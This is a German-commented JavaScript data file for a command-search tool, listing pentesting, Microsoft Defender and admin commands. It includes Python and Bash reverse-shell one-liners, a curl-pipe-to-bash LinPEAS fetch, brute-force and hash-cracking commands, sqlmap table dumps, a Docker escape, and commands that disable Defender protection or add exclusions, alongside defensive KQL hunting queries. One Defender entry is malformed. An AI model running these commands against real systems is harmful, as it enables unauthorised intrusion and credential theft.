// ═══════════════════════════════════════════════════════════════
//  CMD SEARCH – Datenbank
//  Struktur pro Eintrag:
//    group  : Oberkategorie (z. B. "Pentesting", "Microsoft Defender")
//    cat    : Tool / Unterkategorie (z. B. "nmap", "defender-av")
//    title  : Kurzer Name des Commands
//    desc   : Beschreibung was der Command macht
//    cmd    : Der eigentliche Befehl (Platzhalter mit {NAME})
//    tags   : Array von Stichwörtern für die Suche
// ═══════════════════════════════════════════════════════════════

const DB = [

  // ┌─────────────────────────────────────────────────────────┐
  // │  GRUPPE: Pentesting                                     │
  // └─────────────────────────────────────────────────────────┘

  // ── Nmap ──────────────────────────────────────────────────
  { group:"Pentesting", cat:"nmap", title:"Full TCP SYN Scan",
    desc:"Schneller SYN-Scan aller 65535 Ports mit Service-Erkennung und Standard-Scripts.",
    cmd:"nmap -sV -sC -p- --min-rate 5000 -oA full_tcp {TARGET}", tags:["reconnaissance","portscan"] },
  { group:"Pentesting", cat:"nmap", title:"UDP Top-1000 Scan",
    desc:"UDP-Scan der 1000 häufigsten Ports. Findet DNS/SNMP/TFTP.",
    cmd:"sudo nmap -sU --top-ports 1000 -oA udp {TARGET}", tags:["reconnaissance","udp"] },
  { group:"Pentesting", cat:"nmap", title:"OS Detection",
    desc:"Betriebssystem- und Version-Erkennung mit aggressivem Timing.",
    cmd:"sudo nmap -O -sV -T4 {TARGET}", tags:["reconnaissance","os"] },
  { group:"Pentesting", cat:"nmap", title:"NSE Vuln Scan",
    desc:"Führt alle vuln-Scripts aus dem NSE-Katalog aus.",
    cmd:"nmap --script vuln -sV -p {PORTS} {TARGET}", tags:["vulnerability","nse"] },
  { group:"Pentesting", cat:"nmap", title:"SMB Scripts",
    desc:"Enumeriert SMB-Shares/User und prüft bekannte SMB-Schwachstellen.",
    cmd:"nmap -p 139,445 --script smb-enum-shares,smb-enum-users,smb-vuln* {TARGET}", tags:["smb","enumeration"] },

  // ── Netcat ────────────────────────────────────────────────
  { group:"Pentesting", cat:"netcat", title:"Listener (Reverse Shell)",
    desc:"Öffnet einen TCP-Listener auf dem Angreifer-System.",
    cmd:"nc -lvnp {PORT}", tags:["shell","listener"] },
  { group:"Pentesting", cat:"netcat", title:"Banner Grab",
    desc:"Verbindet sich mit einem Port und liest den Banner.",
    cmd:"nc -nv {TARGET} {PORT}", tags:["reconnaissance","banner"] },
  { group:"Pentesting", cat:"netcat", title:"File Transfer (Empfänger)",
    desc:"Empfängt eine Datei über Netcat und speichert sie lokal.",
    cmd:"nc -lvnp {PORT} > output.file", tags:["filetransfer"] },
  { group:"Pentesting", cat:"netcat", title:"File Transfer (Sender)",
    desc:"Sendet eine Datei zu einem laufenden Netcat-Listener.",
    cmd:"nc -nv {TARGET} {PORT} < input.file", tags:["filetransfer"] },

  // ── curl ──────────────────────────────────────────────────
  { group:"Pentesting", cat:"curl", title:"HTTP POST mit JSON",
    desc:"Sendet einen POST-Request mit JSON-Body und Content-Type Header.",
    cmd:"curl -s -X POST {URL} -H 'Content-Type: application/json' -d '{\"key\":\"value\"}'", tags:["http","api"] },
  { group:"Pentesting", cat:"curl", title:"Datei herunterladen",
    desc:"Lädt eine Datei herunter und speichert sie unter dem Original-Dateinamen.",
    cmd:"curl -LO {URL}", tags:["download"] },
  { group:"Pentesting", cat:"curl", title:"Custom Header + Auth",
    desc:"Request mit Bearer-Token und eigenem Header.",
    cmd:"curl -s -H 'Authorization: Bearer {TOKEN}' -H 'X-Custom: value' {URL}", tags:["http","auth","api"] },
  { group:"Pentesting", cat:"curl", title:"Proxy (Burp Suite)",
    desc:"Leitet den Request durch Burp Suite (localhost:8080).",
    cmd:"curl -x http://127.0.0.1:8080 -k {URL}", tags:["proxy","burp"] },
  { group:"Pentesting", cat:"curl", title:"SSRF Probe",
    desc:"Testet auf Server-Side Request Forgery mit internem Ziel.",
    cmd:"curl -s '{URL}?url=http://127.0.0.1:80/'", tags:["ssrf","vulnerability"] },

  // ── Gobuster ──────────────────────────────────────────────
  { group:"Pentesting", cat:"gobuster", title:"Directory Bruteforce",
    desc:"Brute-forcet Verzeichnisse und Dateien mit gängiger Wordlist.",
    cmd:"gobuster dir -u {URL} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50", tags:["web","fuzzing","enumeration"] },
  { group:"Pentesting", cat:"gobuster", title:"DNS Subdomain Scan",
    desc:"Enumeriert Subdomains einer Domain.",
    cmd:"gobuster dns -d {DOMAIN} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50", tags:["dns","subdomain","enumeration"] },
  { group:"Pentesting", cat:"gobuster", title:"VHost Fuzzing",
    desc:"Findet virtuelle Hosts (vhosts) auf einem Webserver.",
    cmd:"gobuster vhost -u http://{TARGET} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain", tags:["vhost","web","enumeration"] },

  // ── ffuf ──────────────────────────────────────────────────
  { group:"Pentesting", cat:"ffuf", title:"Web Fuzzing GET",
    desc:"Fuzzt URL-Pfade und filtert nach Statuscode 404.",
    cmd:"ffuf -u {URL}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -mc all -fc 404", tags:["web","fuzzing"] },
  { group:"Pentesting", cat:"ffuf", title:"POST Parameter Fuzzing",
    desc:"Fuzzt POST-Parameter (z. B. Login-Formular).",
    cmd:"ffuf -u {URL} -X POST -d 'user=FUZZ&pass=test' -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -mc 200", tags:["web","fuzzing","brute"] },
  { group:"Pentesting", cat:"ffuf", title:"Subdomain Fuzzing",
    desc:"Findet Subdomains über den Host-Header.",
    cmd:"ffuf -u http://{DOMAIN} -H 'Host: FUZZ.{DOMAIN}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200", tags:["dns","subdomain","fuzzing"] },

  // ── SQLmap ────────────────────────────────────────────────
  { group:"Pentesting", cat:"sqlmap", title:"Basis-Scan",
    desc:"Testet eine URL auf SQL-Injection-Schwachstellen.",
    cmd:"sqlmap -u '{URL}?id=1' --batch --dbs", tags:["sqli","database"] },
  { group:"Pentesting", cat:"sqlmap", title:"POST Request Scan",
    desc:"Liest einen gespeicherten Burp-Request und scannt auf SQLi.",
    cmd:"sqlmap -r request.txt --batch --level 5 --risk 3 --dbs", tags:["sqli","database"] },
  { group:"Pentesting", cat:"sqlmap", title:"Tabellen dumpen",
    desc:"Dumpt alle Tabellen einer spezifischen Datenbank.",
    cmd:"sqlmap -u '{URL}?id=1' -D {DB} --tables --dump --batch", tags:["sqli","database","exfiltration"] },

  // ── Hydra ─────────────────────────────────────────────────
  { group:"Pentesting", cat:"hydra", title:"SSH Brute Force",
    desc:"Brute-forcet SSH-Zugangsdaten mit einer Passwort-Liste.",
    cmd:"hydra -l {USER} -P /usr/share/wordlists/rockyou.txt ssh://{TARGET}", tags:["brute","ssh","password"] },
  { group:"Pentesting", cat:"hydra", title:"HTTP Form Brute Force",
    desc:"Brute-forcet ein Login-Formular via POST.",
    cmd:"hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {TARGET} http-post-form '/login:username=^USER^&password=^PASS^:Invalid'", tags:["brute","web","password"] },
  { group:"Pentesting", cat:"hydra", title:"FTP Brute Force",
    desc:"Brute-forcet FTP mit Benutzerliste und Passwortliste.",
    cmd:"hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://{TARGET}", tags:["brute","ftp","password"] },

  // ── SSH ───────────────────────────────────────────────────
  { group:"Pentesting", cat:"ssh", title:"Verbindung mit Key",
    desc:"SSH-Verbindung mit einem privaten Key-File.",
    cmd:"ssh -i {KEYFILE} {USER}@{TARGET}", tags:["access","authentication"] },
  { group:"Pentesting", cat:"ssh", title:"Local Port Forward",
    desc:"Leitet einen Remote-Port auf den lokalen Rechner weiter.",
    cmd:"ssh -L {LPORT}:127.0.0.1:{RPORT} {USER}@{TARGET} -N", tags:["tunneling","portforward"] },
  { group:"Pentesting", cat:"ssh", title:"Remote Port Forward",
    desc:"Öffnet einen Tunnel vom Remote-Host zurück zum lokalen Rechner.",
    cmd:"ssh -R {RPORT}:127.0.0.1:{LPORT} {USER}@{TARGET} -N", tags:["tunneling","portforward"] },
  { group:"Pentesting", cat:"ssh", title:"Dynamic SOCKS Proxy",
    desc:"Erstellt einen SOCKS5-Proxy-Tunnel für Proxychains.",
    cmd:"ssh -D 1080 -N -f {USER}@{TARGET}", tags:["tunneling","proxy","socks"] },
  { group:"Pentesting", cat:"ssh", title:"SCP File Transfer",
    desc:"Kopiert eine Datei vom Remote-Host auf den lokalen Rechner.",
    cmd:"scp -i {KEYFILE} {USER}@{TARGET}:{REMOTE_PATH} {LOCAL_PATH}", tags:["filetransfer"] },

  // ── John the Ripper ───────────────────────────────────────
  { group:"Pentesting", cat:"john", title:"Hash cracken (rockyou)",
    desc:"Knackt Hash-Dateien mit der rockyou Wortliste.",
    cmd:"john --wordlist=/usr/share/wordlists/rockyou.txt {HASHFILE}", tags:["cracking","password","hash"] },
  { group:"Pentesting", cat:"john", title:"ZIP Passwort cracken",
    desc:"Extrahiert Hash aus ZIP und knackt ihn mit John.",
    cmd:"zip2john {FILE}.zip > hash.txt && john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt", tags:["cracking","password","zip"] },
  { group:"Pentesting", cat:"john", title:"Ergebnisse anzeigen",
    desc:"Zeigt bereits gecrackte Passwörter aus der Pot-Datei.",
    cmd:"john --show {HASHFILE}", tags:["cracking","password"] },

  // ── Hashcat ───────────────────────────────────────────────
  { group:"Pentesting", cat:"hashcat", title:"MD5 cracken",
    desc:"Knackt MD5-Hashes mit Wörterbuch-Angriff (Mode 0).",
    cmd:"hashcat -m 0 -a 0 {HASHFILE} /usr/share/wordlists/rockyou.txt", tags:["cracking","password","hash","md5"] },
  { group:"Pentesting", cat:"hashcat", title:"NTLM cracken",
    desc:"Knackt NTLM-Hashes (Windows) mit rockyou.",
    cmd:"hashcat -m 1000 -a 0 {HASHFILE} /usr/share/wordlists/rockyou.txt", tags:["cracking","password","ntlm","windows"] },
  { group:"Pentesting", cat:"hashcat", title:"SHA-256 cracken",
    desc:"Knackt SHA-256-Hashes mit Wörterbuch + Regeln.",
    cmd:"hashcat -m 1400 -a 0 {HASHFILE} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule", tags:["cracking","password","sha256"] },

  // ── Python ────────────────────────────────────────────────
  { group:"Pentesting", cat:"python", title:"HTTP Server",
    desc:"Startet einen simplen HTTP-Fileserver auf Port 8000.",
    cmd:"python3 -m http.server {PORT}", tags:["server","filetransfer"] },
  { group:"Pentesting", cat:"python", title:"Reverse Shell (Python3)",
    desc:"Python3 One-Liner für eine Reverse Shell.",
    cmd:"python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{IP}',{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"", tags:["shell","reverse"] },
  { group:"Pentesting", cat:"python", title:"TTY Upgrade",
    desc:"Upgraded eine einfache Shell zu einer voll-interaktiven PTY.",
    cmd:"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", tags:["shell","pty","upgrade"] },

  // ── Linux / Bash ──────────────────────────────────────────
  { group:"Pentesting", cat:"linux", title:"SUID Files finden",
    desc:"Sucht nach Dateien mit gesetztem SUID-Bit (Privilege Escalation).",
    cmd:"find / -perm -4000 -type f 2>/dev/null", tags:["privesc","suid"] },
  { group:"Pentesting", cat:"linux", title:"World-Writable Dirs",
    desc:"Findet für alle beschreibbare Verzeichnisse.",
    cmd:"find / -writable -type d 2>/dev/null | grep -v proc", tags:["privesc"] },
  { group:"Pentesting", cat:"linux", title:"Cron Jobs anzeigen",
    desc:"Listet alle Cron-Jobs auf dem System auf.",
    cmd:"cat /etc/crontab && ls -la /etc/cron.*/ && crontab -l 2>/dev/null", tags:["privesc","cron"] },
  { group:"Pentesting", cat:"linux", title:"Passwörter in Dateien",
    desc:"Rekursive Suche nach 'password' in Textdateien.",
    cmd:"grep -rn 'password' /var/www/ 2>/dev/null --include='*.php,*.conf,*.txt,*.env'", tags:["enumeration","credentials"] },
  { group:"Pentesting", cat:"linux", title:"Netzwerk-Verbindungen",
    desc:"Zeigt aktive TCP-Verbindungen und lauschende Ports.",
    cmd:"ss -tnlp", tags:["network","enumeration"] },
  { group:"Pentesting", cat:"linux", title:"Bash Reverse Shell",
    desc:"One-Liner Bash Reverse Shell.",
    cmd:"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1", tags:["shell","reverse"] },
  { group:"Pentesting", cat:"linux", title:"Sudo Rechte prüfen",
    desc:"Zeigt, welche Befehle der aktuelle User mit sudo ausführen darf.",
    cmd:"sudo -l", tags:["privesc","sudo"] },
  { group:"Pentesting", cat:"linux", title:"LinPEAS ausführen",
    desc:"Lädt LinPEAS herunter und führt es direkt aus (In-Memory).",
    cmd:"curl -s https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash", tags:["privesc","enumeration"] },
  { group:"Pentesting", cat:"linux", title:"Capabilities prüfen",
    desc:"Listet Binaries mit gesetzten Linux-Capabilities auf.",
    cmd:"getcap -r / 2>/dev/null", tags:["privesc","capabilities"] },

  // ── OpenSSL ───────────────────────────────────────────────
  { group:"Pentesting", cat:"openssl", title:"Zertifikat Info",
    desc:"Zeigt Zertifikat-Details eines Servers (SAN, Ablaufdatum etc.).",
    cmd:"openssl s_client -connect {TARGET}:443 2>/dev/null | openssl x509 -noout -text", tags:["tls","ssl","reconnaissance"] },
  { group:"Pentesting", cat:"openssl", title:"Passwort-Hash generieren",
    desc:"Generiert einen SHA-512 crypt(3) Hash (für /etc/shadow).",
    cmd:"openssl passwd -6 -salt xyz {PASSWORD}", tags:["password","hash"] },

  // ── Docker (Pentest) ──────────────────────────────────────
  { group:"Pentesting", cat:"docker", title:"Alle Container auflisten",
    desc:"Zeigt alle laufenden und gestoppten Container.",
    cmd:"docker ps -a", tags:["enumeration","container"] },
  { group:"Pentesting", cat:"docker", title:"Container Shell",
    desc:"Öffnet eine interaktive Shell in einem laufenden Container.",
    cmd:"docker exec -it {CONTAINER_ID} /bin/bash", tags:["access","container"] },
  { group:"Pentesting", cat:"docker", title:"Escape via Mounten",
    desc:"Docker Escape: Mounted das Host-Filesystem in den Container.",
    cmd:"docker run -v /:/mnt --rm -it alpine chroot /mnt sh", tags:["privesc","escape","container"] },

  // ── Git (Pentest) ─────────────────────────────────────────
  { group:"Pentesting", cat:"git", title:"History nach Secrets durchsuchen",
    desc:"Sucht in der gesamten Git-History nach Passwörtern/Secrets.",
    cmd:"git log --all --oneline | xargs -I{} git show {} | grep -iE 'password|secret|token|key'", tags:["secrets","enumeration"] },
  { group:"Pentesting", cat:"git", title:"Gelöschte Dateien finden",
    desc:"Findet gelöschte Dateien in der Git-History.",
    cmd:"git log --all --full-history -- {FILEPATH}", tags:["forensics","recovery"] },


  // ┌─────────────────────────────────────────────────────────┐
  // │  GRUPPE: Microsoft Defender                             │
  // └─────────────────────────────────────────────────────────┘

  // ── Defender AV (PowerShell) ──────────────────────────────
  { group:"Microsoft Defender", cat:"defender-av", title:"Status Defender anzeigen",
    desc:"Zeige den Status von Microsoft Defender an.",
    cmd:"Get-Mp​ComputerStatus":["status","antivirus","powershell"] },
  { group:"Microsoft Defender", cat:"defender-av", title:"Full Scan starten",
    desc:"Startet einen vollständigen Antivirus-Scan des Systems.",
    cmd:"Start-MpScan -ScanType FullScan", tags:["scan","antivirus","powershell"] },
  { group:"Microsoft Defender", cat:"defender-av", title:"Scan-Status abfragen",
    desc:"Zeigt den aktuellen Status des Defender Antivirus an.",
    cmd:"Get-MpComputerStatus | Select-Object AMRunningMode, AntivirusEnabled, RealTimeProtectionEnabled, LastFullScanTime", tags:["status","powershell"] },
  { group:"Microsoft Defender", cat:"defender-av", title:"Signatures aktualisieren",
    desc:"Aktualisiert die Defender-Virensignaturen.",
    cmd:"Update-MpSignature", tags:["update","signatures","powershell"] },
  { group:"Microsoft Defender", cat:"defender-av", title:"Exclusion hinzufügen (Pfad)",
    desc:"Fügt einen Pfad zur Defender-Ausschlussliste hinzu.",
    cmd:"Add-MpPreference -ExclusionPath '{PATH}'", tags:["exclusion","whitelist","powershell"] },
  { group:"Microsoft Defender", cat:"defender-av", title:"Exclusion hinzufügen (Prozess)",
    desc:"Fügt einen Prozess zur Defender-Ausschlussliste hinzu.",
    cmd:"Add-MpPreference -ExclusionProcess '{PROCESS.EXE}'", tags:["exclusion","whitelist","powershell"] },
  { group:"Microsoft Defender", cat:"defender-av", title:"Alle Exclusions anzeigen",
    desc:"Listet alle konfigurierten Exclusions auf.",
    cmd:"Get-MpPreference | Select-Object -ExpandProperty ExclusionPath", tags:["exclusion","powershell"] },
  { group:"Microsoft Defender", cat:"defender-av", title:"Quarantäne anzeigen",
    desc:"Zeigt alle Dateien in der Defender-Quarantäne.",
    cmd:"Get-MpThreatDetection | Select-Object ThreatID, ActionSuccess, InitialDetectionTime, Resources", tags:["quarantine","threats","powershell"] },
  { group:"Microsoft Defender", cat:"defender-av", title:"Bedrohungsdetails abrufen",
    desc:"Zeigt alle erkannten Bedrohungen mit Details.",
    cmd:"Get-MpThreat | Select-Object ThreatName, SeverityID, CategoryID, IsActive", tags:["threats","powershell"] },
  { group:"Microsoft Defender", cat:"defender-av", title:"Real-Time Protection deaktivieren",
    desc:"Deaktiviert den Echtzeit-Schutz (Admin-Rechte erforderlich).",
    cmd:"Set-MpPreference -DisableRealtimeMonitoring $true", tags:["config","rtprotection","powershell"] },

  // ── Defender for Endpoint – KQL ───────────────────────────
  { group:"Microsoft Defender", cat:"defender-mde", title:"Alerts nach Severity",
    desc:"Listet alle aktiven High/Critical-Alerts sortiert nach Zeitstempel.",
    cmd:"AlertInfo\n| where Severity in ('High', 'Critical')\n| where Status != 'Resolved'\n| order by Timestamp desc\n| take 50", tags:["kql","alerts","mde"] },
  { group:"Microsoft Defender", cat:"defender-mde", title:"PowerShell Encoded Commands",
    desc:"Sucht nach verdächtigen PowerShell-Befehlen mit Base64-Encoding.",
    cmd:"DeviceProcessEvents\n| where FileName =~ 'powershell.exe'\n| where ProcessCommandLine has '-enc' or ProcessCommandLine has '-encodedCommand'\n| project Timestamp, DeviceName, ProcessCommandLine\n| order by Timestamp desc", tags:["kql","powershell","hunting","defense-evasion"] },
  { group:"Microsoft Defender", cat:"defender-mde", title:"Netzwerkverbindungen by Prozess",
    desc:"Findet Prozesse die auf verdächtigen Ports nach aussen verbinden.",
    cmd:"DeviceNetworkEvents\n| where RemotePort in (4444, 1337, 8888, 9001)\n| summarize count() by InitiatingProcessFileName, RemoteIP, RemotePort\n| order by count_ desc", tags:["kql","network","hunting"] },
  { group:"Microsoft Defender", cat:"defender-mde", title:"Onboarded Devices auflisten",
    desc:"Zeigt alle onboardeten Geräte mit Status.",
    cmd:"DeviceInfo\n| summarize arg_max(Timestamp, *) by DeviceId\n| where OnboardingStatus == 'Onboarded'\n| project DeviceName, OSPlatform, PublicIP, LastSeen", tags:["kql","mde","inventory"] },


  // ┌─────────────────────────────────────────────────────────┐
  // │  GRUPPE: Administration                                 │
  // └─────────────────────────────────────────────────────────┘

  // ── Docker (Ops) ──────────────────────────────────────────
  { group:"Administration", cat:"docker-ops", title:"Container Logs",
    desc:"Zeigt die letzten 100 Log-Zeilen eines Containers in Echtzeit.",
    cmd:"docker logs --tail 100 -f {CONTAINER_ID}", tags:["docker","logs","debugging"] },
  { group:"Administration", cat:"docker-ops", title:"Container Ressourcen",
    desc:"Zeigt CPU/RAM-Verbrauch aller laufenden Container.",
    cmd:"docker stats --no-stream", tags:["docker","monitoring"] },
  { group:"Administration", cat:"docker-ops", title:"System bereinigen",
    desc:"Entfernt alle nicht verwendeten Images, Container und Volumes.",
    cmd:"docker system prune -a --volumes", tags:["docker","cleanup"] },

  // ── Git (Ops) ─────────────────────────────────────────────
  { group:"Administration", cat:"git-ops", title:"Gemergte Branches löschen",
    desc:"Löscht alle bereits gemergten lokalen Branches.",
    cmd:"git branch --merged | grep -v '\\*\\|main\\|master\\|develop' | xargs git branch -d", tags:["git","cleanup","branch"] },
  { group:"Administration", cat:"git-ops", title:"Letzten Commit rückgängig",
    desc:"Macht den letzten Commit rückgängig (Dateien bleiben im Working Tree).",
    cmd:"git reset HEAD~1 --soft", tags:["git","undo"] },
  { group:"Administration", cat:"git-ops", title:"Remote Tags synchronisieren",
    desc:"Löscht lokale Tags und holt sie neu vom Remote.",
    cmd:"git tag -l | xargs git tag -d && git fetch --tags", tags:["git","tags","sync"] },

];
